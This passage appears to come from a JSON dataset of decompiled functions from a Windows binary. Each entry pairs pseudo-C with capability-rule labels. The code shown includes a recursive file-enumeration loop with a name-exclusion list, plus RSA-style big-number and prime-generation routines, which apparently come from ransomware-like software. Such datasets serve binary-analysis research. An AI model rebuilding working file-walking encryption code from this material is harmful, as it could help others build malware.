((iVar4 = (*pcVar2)(&var_3dch, &lpString),  pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW\n                               ,  iVar4 != 0 &&\n                               (iVar4 = (*pcVar2)(&var_36ch, &lpString),  pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW\n                               ,  iVar4 != 0)))))))))) {\n                            piVar6 = arg_8h;\n                            do {\n                                iVar1 = *piVar6;\n                                *(piVar6 + (&pszPath - arg_8h)) = iVar1;\n                                piVar6 = piVar6 + 1;\n                            } while (iVar1 != 0);\n                            (*_sym.imp.SHLWAPI.dll_PathAddBackslashW)(&pszPath);\n                            puVar8 = &lpString;\n                            do {\n                                iVar1 = *puVar8;\n                                puVar8 = puVar8 + 2;\n                            } while (iVar1 != 0);\n                            uVar9 = puVar8 - &lpString;\n                            puVar8 = &stack0xfffff476;\n                            do {\n                                piVar6 = puVar8 + 2;\n                                puVar8 = puVar8 + 2;\n                            } while (*piVar6 != 0);\n                            puVar10 = &lpString;\n                            for (uVar7 = uVar9 >> 2; uVar7 != 0; uVar7 = uVar7 - 1) {\n                                *puVar8 = *puVar10;\n                                puVar10 = puVar10 + 1;\n                                puVar8 = puVar8 + 1;\n                            }\n                            for (uVar9 = uVar9 & 3; uVar9 != 0; uVar9 = uVar9 - 1) {\n                                *puVar8 = *puVar10;\n                                puVar10 = puVar10 + 1;\n                                puVar8 = puVar8 + 1;\n                            }\n                            fcn.004064c0(&pszPath);\n                            pcVar11 = _sym.imp.KERNEL32.dll_FindNextFileW;\n                            iVar3 = var_8h;\n                        }\n                    }\n                }\n                else {\n                    iVar4 = (*pcVar2)(&lpString, &var_388h);\n                    if ((((((iVar4 != 0) && (iVar4 = (*pcVar2)(&lpString, &var_210h),  iVar4 != 0)) &&\n                          (iVar4 = (*pcVar2)(&lpString, &var_2c0h),  iVar4 != 0)) &&\n                         (((iVar4 = (*pcVar2)(&lpString, &var_3a4h),  iVar4 != 0 &&\n                           (iVar4 = (*pcVar2)(&lpString, &var_3c0h),  iVar4 != 0)) &&\n                          ((iVar4 = (*pcVar2)(&lpString, &var_33ch),  iVar4 != 0 &&\n                           ((iVar4 = (*pcVar2)(&lpString, &var_30h),  iVar4 != 0 &&\n                            (iVar4 = (*pcVar2)(&lpString, &var_454h),  iVar4 != 0)))))))) &&\n                        (iVar4 = (*pcVar2)(&lpString, &var_2d4h),  iVar4 != 0)) &&\n                       (((((iVar4 = (*pcVar2)(&lpString, &var_26ch),  iVar4 != 0 &&\n                           (iVar4 = (*pcVar2)(&lpString, &var_420h),  iVar4 != 0)) &&\n                          (iVar4 = (*pcVar2)(&lpString, &var_28ch),  iVar4 != 0)) &&\n                         ((iVar4 = (*pcVar2)(&lpString, &var_354h),  iVar4 != 0 &&\n                          (iVar4 = (*pcVar2)(&lpString, &var_29ch),  iVar4 != 0)))) &&\n                        (iVar4 = (*pcVar2)(&lpString, &var_2ach),  iVar4 != 0)))) {\n                        (*_sym.imp.USER32.dll_wsprintfW)(&lpFileName, &ARG_1, arg_8h, &lpString);\n                        fcn.00407e50(&lpFileName);\n                    }\n                }\n            }\n            iVar4 = (*pcVar11)(iVar3, &lpFindFileData);\n        } while (iVar4 == 1);\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar4 == 0x12) {\n            (*_sym.imp.KERNEL32.dll_FindClose)(iVar3);\n        }\n    }\n    return;\n}\n",
        "token_count": 9519
    },
    "0040b300": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040b300(uint *arg_8h, uint32_t arg_ch, code *arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint32_t arg_ch_00;\n    uint var_4h;\n    \n    arg_ch_00 = ((arg_ch & 3) != 0) + (arg_ch >> 2);\n    if (arg_8h[1] != arg_ch_00) {\n        if (arg_8h[2] != 0) {\n            fcn.0040ef10(arg_8h[2], arg_8h[1] << 2);\n            sub.msvcrt.dll_free(arg_8h[2]);\n        }\n        *arg_8h = 1;\n        arg_8h[1] = 0;\n        arg_8h[2] = 0;\n        if (10000 < arg_ch_00) {\n            return -0x10;\n        }\n        if (arg_ch_00 != 0) {\n            iVar1 = sub.msvcrt.dll_calloc(arg_ch_00, 4);\n            if (iVar1 == 0) {\n                return -0x10;\n            }\n            if (arg_8h[2] != 0) {\n                fcn.004013a0(iVar1, arg_8h[2], arg_8h[1] << 2);\n                fcn.0040ef10(arg_8h[2], arg_8h[1] << 2);\n                sub.msvcrt.dll_free(arg_8h[2]);\n            }\n            arg_8h[1] = arg_ch_00;\n            arg_8h[2] = iVar1;\n        }\n    }\n    iVar1 = fcn.0040c220(arg_8h, 0);\n    if (iVar1 == 0) {\n        (*arg_10h)(arg_14h, arg_8h[2] + (arg_ch_00 * 4 - arg_ch), arg_ch);\n        fcn.0040ccd0(arg_8h[2], arg_ch_00);\n    }\n    return iVar1;\n}\n",
        "token_count": 477
    },
    "0040c710": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040c710(uint *arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t arg_ch_00;\n    uint var_4h;\n    \n    arg_ch_00 = ((arg_10h & 3) != 0) + (arg_10h >> 2);\n    if (arg_8h[1] != arg_ch_00) {\n        if (arg_8h[2] != 0) {\n            fcn.0040ef10(arg_8h[2], arg_8h[1] << 2);\n            sub.msvcrt.dll_free(arg_8h[2]);\n        }\n        *arg_8h = 1;\n        arg_8h[1] = 0;\n        arg_8h[2] = 0;\n        if (10000 < arg_ch_00) {\n            return -0x10;\n        }\n        if (arg_ch_00 != 0) {\n            iVar1 = sub.msvcrt.dll_calloc(arg_ch_00, 4);\n            if (iVar1 == 0) {\n                return -0x10;\n            }\n            if (arg_8h[2] != 0) {\n                fcn.004013a0(iVar1, arg_8h[2], arg_8h[1] << 2);\n                fcn.0040ef10(arg_8h[2], arg_8h[1] << 2);\n                sub.msvcrt.dll_free(arg_8h[2]);\n            }\n            arg_8h[1] = arg_ch_00;\n            arg_8h[2] = iVar1;\n        }\n    }\n    iVar1 = fcn.0040c220(arg_8h, 0);\n    if ((iVar1 == 0) && (arg_ch != 0)) {\n        fcn.004013a0(arg_8h[2] + (arg_ch_00 * 4 - arg_10h), arg_ch, arg_10h);\n        fcn.0040ccd0(arg_8h[2], arg_ch_00);\n    }\n    return iVar1;\n}\n",
        "token_count": 487
    },
    "0040cc20": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040cc20(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    uint var_4h;\n    \n    iVar1 = *(arg_8h + 4);\n    uVar2 = iVar1 * 4;\n    if (uVar2 < arg_10h) {\n        iVar4 = arg_ch + iVar1 * -4 + arg_10h;\n        fcn.00401000(arg_ch, 0, arg_10h + iVar1 * -4);\n        arg_10h = uVar2;\n        arg_ch = iVar4;\n    }\n    else if (arg_10h < uVar2) {\n        uVar3 = arg_10h;\n        do {\n            if (*(*(arg_8h + 8) + (uVar3 & 0xfffffffc)) >> ((uVar3 & 3) << 3) != '\\0') {\n                return 0xfffffff8;\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < uVar2);\n    }\n    if (arg_10h != 0) {\n        uVar2 = 0;\n        puVar5 = arg_ch + -1 + arg_10h;\n        do {\n            uVar3 = uVar2 + 1;\n            *puVar5 = *(*(arg_8h + 8) + (uVar2 & 0xfffffffc)) >> ((uVar2 & 3) << 3);\n            uVar2 = uVar3;\n            puVar5 = puVar5 + -1;\n        } while (uVar3 < arg_10h);\n    }\n    return 0;\n}\n",
        "token_count": 414
    },
    "00401359": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nvoid fcn.00401359(void)\n\n{\n    if (*0x415448 == 0) {\n        *0x415448 = fcn.004046d0(0);\n        *0x415448 = *0x415448 >> 1;\n        if (*0x415448 == 0) {\n            *0x415448 = 0x400000;\n        }\n    }\n    return;\n}\n",
        "token_count": 89
    },
    "00402e07": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nvoid fcn.00402e07(void)\n\n{\n    if (*0x415514 == 0) {\n        *0x415514 = fcn.004046d0(0);\n        *0x415514 = *0x415514 >> 1;\n        if (*0x415514 == 0) {\n            *0x415514 = 0x400000;\n        }\n    }\n    return;\n}\n",
        "token_count": 90
    },
    "0040a370": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040a370(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    if (*(arg_8h + 4) == 0) {\n        return 0;\n    }\n    iVar2 = *(arg_8h + 4) + -1;\n    if (iVar2 != 0) {\n        piVar1 = *(arg_8h + 8) + iVar2 * 4;\n        do {\n            if (*piVar1 != 0) break;\n            piVar1 = piVar1 + -1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    uVar3 = 0;\n    uVar4 = 0x80000000;\n    do {\n        if ((uVar4 & *(*(arg_8h + 8) + iVar2 * 4)) != 0) break;\n        uVar3 = uVar3 + 1;\n        uVar4 = uVar4 >> 1;\n    } while (uVar3 < 0x20);\n    return (iVar2 + 1) * 0x20 - uVar3;\n}\n",
        "token_count": 285
    },
    "0040ac10": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0040ac10(uint *arg_8h, int32_t *arg_ch, int32_t arg_10h, int32_t arg_14h, ulong *arg_18h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint *puVar6;\n    uint *puVar7;\n    int32_t *piVar8;\n    uint var_64ch;\n    uint var_644h;\n    uint var_640h;\n    int32_t var_63ch;\n    int32_t var_638h;\n    int32_t var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint *var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    uint *var_ch;\n    uint *var_8h;\n    uint *var_4h;\n    \n    var_34h = &var_4h;\n    var_4h = NULL;\n    var_3ch = 1;\n    var_38h = 1;\n    iVar1 = fcn.0040a4b0(arg_14h, &var_3ch);\n    if ((0 < iVar1) && (var_8h = **(arg_14h + 8),  (var_8h & 1) != 0)) {\n        var_34h = &var_4h;\n        var_4h = NULL;\n        var_3ch = 1;\n        var_38h = 1;\n        iVar1 = fcn.0040a4b0(arg_10h, &var_3ch);\n        if (-1 < iVar1) {\n            uVar4 = 0x20;\n            uVar5 = (var_8h * 2 + 4U & 8) + var_8h;\n            do {\n                uVar4 = uVar4 >> 1;\n                uVar5 = uVar5 * (2 - uVar5 * var_8h);\n            } while (7 < uVar4);\n            _var_30h = 1;\n            iVar1 = ~uVar5 + 1;\n            var_28h = 0;\n            var_24h = 1;\n            var_20h = 0;\n            var_1ch = 0;\n            var_48h = 1;\n            var_44h = 0;\n            var_40h = 0;\n            fcn.00401000(&var_64ch, 0, 0x600);\n            uVar4 = fcn.0040a370(arg_10h);\n            if (uVar4 < 0x2a0) {\n                if (uVar4 < 0xf0) {\n                    if (uVar4 < 0x50) {\n                        var_ch = (-(0x17 < uVar4) & 2) + 1;\n                    }\n                    else {\n                        var_ch = 0x4;\n                    }\n                }\n                else {\n                    var_ch = 0x5;\n                }\n            }\n            else {\n                var_ch = 0x6;\n            }\n            var_8h = *(arg_14h + 4) + 1;\n            puVar2 = fcn.0040baa0(arg_8h, var_8h);\n            if (((puVar2 == NULL) && (puVar2 = fcn.0040baa0(&var_640h, var_8h),  puVar2 == NULL)) &&\n               (puVar2 = fcn.0040baa0(&var_24h, var_8h * 2),  puVar2 == NULL)) {\n                var_4ch = *arg_ch;\n                if (var_4ch == -1) {\n                    puVar2 = fcn.0040a590(&var_48h, arg_ch);\n                    if (puVar2 != NULL) goto code_r0x0040b1ed;\n                    arg_ch = &var_48h;\n                    var_48h = 1;\n                }\n                if ((arg_18h == NULL) || (*(arg_18h + 1) == 0)) {\n                    puVar2 = fcn.0040c220(&var_30h, 1);\n                    if ((puVar2 != NULL) ||\n                       ((puVar2 = fcn.0040c820(&var_30h, *(arg_14h + 4) << 6),  puVar2 != NULL ||\n                        (puVar2 = fcn.0040c360(&var_30h, &var_30h, arg_14h),  puVar2 != NULL)))) goto code_r0x0040b1ed;\n                    if (arg_18h != NULL) {\n                        *arg_18h = _var_30h;\n                        *(arg_18h + 1) = var_28h;\n                    }\n                }\n                else {\n                    _var_30h = *arg_18h;\n                    var_28h = *(arg_18h + 1);\n                }\n                iVar3 = fcn.0040a4b0(arg_ch, arg_14h);\n                if (iVar3 < 0) {\n                    puVar2 = fcn.0040a590(&var_640h, arg_ch);\n                }\n                else {\n                    puVar2 = fcn.0040c360(&var_640h, arg_ch, arg_14h);\n                }\n                if ((((puVar2 == NULL) &&\n                     (puVar2 = fcn.0040d2a0(&var_640h, &var_30h, arg_14h, iVar1, &var_24h),  puVar2 == NULL)) &&\n                    (puVar2 = fcn.0040a590(arg_8h, &var_30h),  puVar2 == NULL)) &&\n                   (puVar2 = fcn.0040d3c0(arg_8h, arg_14h, iVar1, &var_24h),  puVar2 == NULL)) {\n                    if (0x1 < var_ch) {\n                        var_14h = var_ch - 1;\n                        var_4h = 1 << (var_14h & 0x1f);\n                        var_8h = &var_64ch + var_4h * 3;\n                        puVar2 = fcn.0040baa0(var_8h, *(arg_14h + 4) + 1);\n                        if ((puVar2 != NULL) || (puVar2 = fcn.0040a590(var_8h, &var_640h),  puVar2 != NULL))\n                        goto code_r0x0040b1ed;\n                        var_18h = puVar2;\n                        if (var_14h != NULL) {\n                            do {\n                                puVar2 = fcn.0040d2a0(var_8h, var_8h, arg_14h, iVar1, &var_24h);\n                                if (puVar2 != NULL) goto code_r0x0040b1ed;\n                                var_18h = var_18h + 1;\n                            } while (var_18h < var_14h);\n                        }\n                        var_8h = var_4h + 1;\n                        var_4h = 1 << (var_ch & 0x1f);\n                        if (var_8h < var_4h) {\n                            var_10h = &var_64ch + var_8h * 3;\n                            do {\n                                puVar2 = fcn.0040baa0(var_10h, *(arg_14h + 4) + 1);\n                                if (((puVar2 != NULL) || (puVar2 = fcn.0040a590(var_10h, var_10h + -3),  puVar2 != NULL)\n                                    ) || (puVar2 = fcn.0040d2a0(var_10h, &var_640h, arg_14h, iVar1, &var_24h), \n                                         puVar2 != NULL)) goto code_r0x0040b1ed;\n                                var_8h = var_8h + 1;\n                                var_10h = var_10h + 3;\n                            } while (var_8h < var_4h);\n                        }\n                    }\n                    puVar6 = NULL;\n                    var_4h = NULL;\n                    var_18h = *(arg_10h + 4);\n                    var_8h = NULL;\n                    puVar7 = var_ch;\n                    var_14h = puVar6;\n                    var_10h = puVar6;\n                    do {\n                        do {\n                            while( true ) {\n                                if (var_4h == NULL) {\n                                    if (var_18h == NULL) {\n                                        var_4h = NULL;\n                                        if (puVar6 == NULL) goto code_r0x0040b18d;\n                                        goto code_r0x0040b130;\n                                    }\n                                    var_18h = var_18h - 1;\n                                    var_4h = 0x20;\n                                }\n                                var_4h = var_4h - 1;\n                                uVar4 = *(*(arg_10h + 8) + var_18h * 4) >> (var_4h & 0x1f) & 1;\n                                if (uVar4 == 0) break;\ncode_r0x0040b0a6:\n                                var_14h = puVar6 + 1;\n                                var_8h = 0x2;\n                                var_10h = var_10h | uVar4 << (puVar7 - var_14h & 0x1fU);\n                                puVar6 = var_14h;\n                                if (var_14h == puVar7) {\n                                    puVar7 = NULL;\n                                    do {\n                                        puVar2 = fcn.0040d2a0(arg_8h, arg_8h, arg_14h, iVar1, &var_24h);\n                                        if (puVar2 != NULL) goto code_r0x0040b1ed;\n                                        puVar7 = puVar7 + 1;\n                                    } while (puVar7 < var_ch);\n                                    puVar2 = fcn.0040d2a0(arg_8h, &var_64ch + var_10h * 3, arg_14h, iVar1, &var_24h);\n                                    if (puVar2 != NULL) goto code_r0x0040b1ed;\n                                    var_8h = 0x1;\n                                    puVar7 = var_ch;\n                                    puVar6 = puVar2;\n                                    var_14h = puVar2;\n                                    var_10h = puVar2;\n                                }\n                            }\n                        } while (var_8h == NULL);\n                        if (var_8h != 0x1) goto code_r0x0040b0a6;\n                        puVar2 = fcn.0040d2a0(arg_8h, arg_8h, arg_14h, iVar1, &var_24h);\n                        puVar7 = var_ch;\n                        puVar6 = var_14h;\n                    } while (puVar2 == NULL);\n                }\n            }\ncode_r0x0040b1ed:\n            uVar4 = 1 << (var_ch & 0x1f);\n            uVar5 = 1 << (var_ch - 1 & 0x1f);\n            if (uVar5 < uVar4) {\n                var_4h = uVar4 - uVar5;\n                piVar8 = &var_644h + uVar5 * 3;\n                do {\n                    if (piVar8 != 0x8) {\n                        iVar1 = *piVar8;\n                        if (iVar1 != 0) {\n                            fcn.0040ef10(iVar1, piVar8[-1] << 2);\n                            sub.msvcrt.dll_free(iVar1);\n                        }\n                        piVar8[-2] = 1;\n                        piVar8[-1] = 0;\n                        *piVar8 = 0;\n                    }\n                    piVar8 = piVar8 + 3;\n                    var_4h = var_4h - 1;\n                } while (var_4h != NULL);\n            }\n            if (var_638h != 0) {\n                fcn.0040ef10(var_638h, var_63ch << 2);\n                sub.msvcrt.dll_free(var_638h);\n            }\n            iVar1 = var_1ch;\n            if (var_1ch != 0) {\n                fcn.0040ef10(var_1ch, var_20h << 2);\n                sub.msvcrt.dll_free(iVar1);\n            }\n            iVar1 = var_40h;\n            if (var_40h != 0) {\n                fcn.0040ef10(var_40h, var_44h << 2);\n                sub.msvcrt.dll_free(iVar1);\n            }\n            iVar1 = var_28h;\n            if (((arg_18h == NULL) || (*(arg_18h + 1) == 0)) && (var_28h != 0)) {\n                fcn.0040ef10(var_28h, var_2ch << 2);\n                sub.msvcrt.dll_free(iVar1);\n            }\n            return puVar2;\n        }\n    }\n    return 0xfffffffc;\n    while (var_4h = var_4h + 1,  var_4h < var_14h) {\ncode_r0x0040b130:\n        puVar2 = fcn.0040d2a0(arg_8h, arg_8h, arg_14h, iVar1, &var_24h);\n        if ((puVar2 != NULL) ||\n           ((var_10h = var_10h * 2,  (var_10h & 1 << (var_ch & 0x1f)) != 0 &&\n            (puVar2 = fcn.0040d2a0(arg_8h, &var_640h, arg_14h, iVar1, &var_24h),  puVar2 != NULL))))\n        goto code_r0x0040b1ed;\n    }\ncode_r0x0040b18d:\n    var_34h = &var_4h;\n    var_4h = 0x1;\n    var_3ch = 1;\n    var_38h = 1;\n    puVar2 = fcn.0040d2a0(arg_8h, &var_3ch, arg_14h, iVar1, &var_24h);\n    if ((((puVar2 == NULL) && (var_4ch == -1)) && (*(arg_10h + 4) != 0)) && ((**(arg_10h + 8) & 1) != 0)) {\n        *arg_8h = 0xffffffff;\n        puVar2 = fcn.0040a300(arg_8h, arg_14h, arg_8h);\n    }\n    goto code_r0x0040b1ed;\n}\n",
        "token_count": 3454
    },
    "0040b6c0": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040b6c0(int32_t *arg_8h, uint32_t arg_ch, uint32_t arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t *puVar4;\n    uint32_t uVar5;\n    uint var_30h;\n    uint var_2ch;\n    uint *var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint *var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (0x1ffd < arg_ch - 3) {\n        return -4;\n    }\n    var_18h = 1;\n    var_14h = 0;\n    var_10h = 0;\n    var_ch = ((arg_ch & 0x1f) != 0) + (arg_ch >> 5);\n    if ((arg_10h & 2) == 0) {\n        if (arg_ch < 0x514) {\n            if (arg_ch < 0x352) {\n                if (arg_ch < 0x28a) {\n                    if (arg_ch < 0x15e) {\n                        if (arg_ch < 0xfa) {\n                            iVar3 = (-(arg_ch < 0x96) & 9) + 0x12;\n                        }\n                        else {\n                            iVar3 = 0xc;\n                        }\n                    }\n                    else {\n                        iVar3 = 8;\n                    }\n                }\n                else {\n                    iVar3 = 4;\n                }\n            }\n            else {\n                iVar3 = 3;\n            }\n        }\n        else {\n            iVar3 = 2;\n        }\n    }\n    else if (arg_ch < 0x5aa) {\n        if (arg_ch < 0x47e) {\n            if (arg_ch < 1000) {\n                if (arg_ch < 0x352) {\n                    if (arg_ch < 0x2ee) {\n                        if (arg_ch < 500) {\n                            if (arg_ch < 0xfa) {\n                                iVar3 = (-(arg_ch < 0x96) & 0xb) + 0x28;\n                            }\n                            else {\n                                iVar3 = 0x1c;\n                            }\n                        }\n                        else {\n                            iVar3 = 0xd;\n                        }\n                    }\n                    else {\n                        iVar3 = 8;\n                    }\n                }\n                else {\n                    iVar3 = 7;\n                }\n            }\n            else {\n                iVar3 = 6;\n            }\n        }\n        else {\n            iVar3 = 5;\n        }\n    }\n    else {\n        iVar3 = 4;\n    }\n    var_8h = var_ch * 4;\n    var_4h = iVar3;\n    iVar2 = fcn.0040b300(arg_8h, var_8h, arg_14h, arg_18h);\n    if (iVar2 != 0) {\n        return iVar2;\n    }\ncode_r0x0040b820:\n    if (0xb504f333 < *(arg_8h[2] + -4 + var_8h)) {\n        if ((arg_ch < var_ch * 0x20) && (iVar2 = fcn.0040c960(arg_8h, var_ch * 0x20 - arg_ch),  iVar2 != 0)) {\n            return iVar2;\n        }\n        *arg_8h[2] = *arg_8h[2] | 1;\n        if ((arg_10h & 1) != 0) {\n            uVar5 = 0;\n            *arg_8h[2] = *arg_8h[2] | 2;\n            arg_ch = arg_8h[1];\n            if (arg_ch != 0) {\n                puVar4 = arg_8h[2] + (arg_ch + -1) * 4;\n                iVar2 = arg_ch;\n                do {\n                    uVar1 = *puVar4;\n                    puVar4 = puVar4 + -1;\n                    uVar5 = (((uVar5 << 0x10 | uVar1 >> 0x10) % 3) * 0x10000 | uVar1 & 0xffff) % 3;\n                    iVar2 = iVar2 + -1;\n                    iVar3 = var_4h;\n                } while (iVar2 != 0);\n            }\n            if (*arg_8h < 0) {\n                if (uVar5 != 0) {\n                    uVar5 = 3 - uVar5;\n                    goto code_r0x0040b907;\n                }\ncode_r0x0040b90b:\n                arg_ch = 8;\ncode_r0x0040b920:\n                var_1ch = &arg_ch;\n                var_24h = 1;\n                var_20h = 1;\n                iVar2 = fcn.0040a300(arg_8h, arg_8h, &var_24h);\n                if (iVar2 != 0) {\n                    return iVar2;\n                }\n            }\n            else {\ncode_r0x0040b907:\n                if (uVar5 == 0) goto code_r0x0040b90b;\n                if (uVar5 == 1) {\n                    arg_ch = 4;\n                    goto code_r0x0040b920;\n                }\n            }\n            iVar2 = fcn.0040a590(&var_18h, arg_8h);\n            if (iVar2 == 0) {\n                iVar2 = fcn.0040c960(&var_18h, 1);\n                while (((iVar2 == 0 &&\n                        ((((iVar2 = fcn.0040cd70(arg_8h),  iVar2 != 0 || (iVar2 = fcn.0040cd70(&var_18h),  iVar2 != 0))\n                          || (iVar2 = fcn.0040ce10(arg_8h, iVar3, arg_14h, arg_18h),  iVar2 != 0)) ||\n                         (iVar2 = fcn.0040ce10(&var_18h, iVar3, arg_14h, arg_18h),  iVar2 != 0)))) && (iVar2 == -0xe)))\n                {\n                    var_1ch = &arg_ch;\n                    arg_ch = 0xc;\n                    var_24h = 1;\n                    var_20h = 1;\n                    iVar2 = fcn.0040a300(arg_8h, arg_8h, &var_24h);\n                    if (iVar2 != 0) break;\n                    var_28h = &arg_ch;\n                    arg_ch = 6;\n                    var_30h = 1;\n                    var_2ch = 1;\n                    iVar2 = fcn.0040a300(&var_18h, &var_18h, &var_30h);\n                }\n            }\n            iVar3 = var_10h;\n            if (var_10h == 0) {\n                return iVar2;\n            }\n            fcn.0040ef10(var_10h, var_14h << 2);\n            sub.msvcrt.dll_free(iVar3);\n            return iVar2;\n        }\n        iVar2 = fcn.0040c0e0(arg_8h, iVar3, arg_14h, arg_18h);\n        if (iVar2 != -0xe) {\n            return iVar2;\n        }\n    }\n    iVar2 = fcn.0040b300(arg_8h, var_8h, arg_14h, arg_18h);\n    if (iVar2 != 0) {\n        return iVar2;\n    }\n    goto code_r0x0040b820;\n}\n",
        "token_count": 1761
    },
    "0040ce10": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040ce10(uint32_t *arg_8h, uint32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint var_64h;\n    uint var_60h;\n    uint *var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint *var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    uint32_t var_28h;\n    int32_t var_24h;\n    int32_t ptr;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_50h = &var_ch;\n    iVar5 = 0;\n    iVar6 = 0;\n    var_28h = 1;\n    var_4h = *arg_8h;\n    var_24h = 0;\n    ptr = 0;\n    var_34h = 1;\n    var_30h = 0;\n    var_2ch = 0;\n    var_40h = 1;\n    var_3ch = 0;\n    var_38h = 0;\n    var_1ch = 1;\n    var_18h = 0;\n    var_14h = 0;\n    var_4ch = 1;\n    var_48h = 0;\n    var_44h = 0;\n    var_ch = 1;\n    var_58h = 1;\n    var_54h = 1;\n    if (var_4h < 1) {\n        iVar2 = fcn.0040a0f0(&var_28h, arg_8h, &var_58h);\n        uVar8 = var_4h;\n        if (iVar2 != 0) goto code_r0x0040d1f0;\n    }\n    else {\n        iVar2 = fcn.0040a3d0(arg_8h, &var_58h);\n        if (iVar2 < 0) {\n            iVar2 = fcn.0040ca70(&var_28h, &var_58h, arg_8h);\n            if (iVar2 != 0) goto code_r0x0040d1f0;\n            uVar8 = -var_4h;\n        }\n        else {\n            iVar2 = fcn.0040ca70(&var_28h, arg_8h, &var_58h);\n            if (iVar2 != 0) goto code_r0x0040d1f0;\n            var_28h = var_4h;\n            uVar8 = var_28h;\n        }\n    }\n    var_28h = uVar8;\n    var_4h = fcn.0040c1d0(&var_28h);\n    iVar2 = fcn.0040a590(&var_34h, &var_28h);\n    if (((iVar2 == 0) && (iVar2 = fcn.0040c960(&var_34h, var_4h),  iVar2 == 0)) && (var_ch = 0,  arg_ch != 0)) {\n        do {\n            var_8h = 0;\n            do {\n                do {\n                    iVar2 = fcn.0040b300(&var_1ch, arg_8h[1] << 2, arg_10h, arg_14h);\n                    iVar5 = var_14h;\n                    iVar6 = var_44h;\n                    if (iVar2 != 0) goto code_r0x0040d1f0;\n                    iVar5 = var_18h;\n                    if (var_18h == 0) {\n                        uVar7 = 0;\n                    }\n                    else {\n                        do {\n                            iVar6 = iVar5;\n                            iVar5 = iVar6 + -1;\n                            if (iVar5 == 0) break;\n                        } while (*(var_14h + iVar5 * 4) == 0);\n                        uVar8 = *(var_14h + iVar5 * 4);\n                        uVar3 = 0x80000000;\n                        uVar7 = 0;\n                        do {\n                            if ((uVar3 & uVar8) != 0) break;\n                            if ((uVar3 >> 1 & uVar8) != 0) {\n                                uVar7 = uVar7 + 1;\n                                break;\n                            }\n                            if ((uVar3 >> 2 & uVar8) != 0) {\n                                uVar7 = uVar7 + 2;\n                                break;\n                            }\n                            if ((uVar3 >> 3 & uVar8) != 0) {\n                                uVar7 = uVar7 + 3;\n                                break;\n                            }\n                            uVar7 = uVar7 + 4;\n                            uVar3 = uVar3 >> 4;\n                        } while (uVar7 < 0x20);\n                        uVar7 = iVar6 * 0x20 - uVar7;\n                    }\n                    iVar5 = var_24h;\n                    if (var_24h == 0) {\n                        uVar4 = 0;\n                    }\n                    else {\n                        do {\n                            iVar6 = iVar5;\n                            iVar5 = iVar6 + -1;\n                            if (iVar5 == 0) break;\n                        } while (*(ptr + iVar5 * 4) == 0);\n                        uVar3 = 0x80000000;\n                        uVar4 = 0;\n                        uVar8 = *(ptr + iVar5 * 4);\n                        